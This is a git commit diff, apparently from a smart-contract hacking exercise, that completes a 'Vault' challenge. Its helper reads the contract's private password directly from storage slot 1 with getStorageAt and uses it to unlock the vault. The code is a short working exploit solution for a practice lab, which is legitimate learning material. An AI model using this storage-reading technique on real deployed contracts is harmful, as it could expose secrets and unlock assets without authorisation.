6180550727f0df1d1f48e466ec226749d0d8b368
agusbrav <agus.brav@gmail.com>
2022-05-15 17:03:02 -0300

    4. Completed Vault contract attack.

--- contracts/4. Vault/VaultHelper.ts
+++ contracts/4. Vault/VaultHelper.ts
@@ -2,12 +2,10 @@ import { expect } from "chai";
 import { ethers, waffle } from "hardhat";
 
 const helper = async (victim: any) => {
-  /* 
-    Add code here that will help you pass the test
-    Note: Unlock without using the string "A very strong password"
-    Unlock the vault by somehow reading the private password from 
-    Vault directly
-  */
+  //Storage 0 => bool locked
+  //Storage 1 => bytes32 password
+  const storage = await ethers.provider.getStorageAt(victim.address, 1);
+  await victim.unlock(storage)
 };
 
 export default helper;
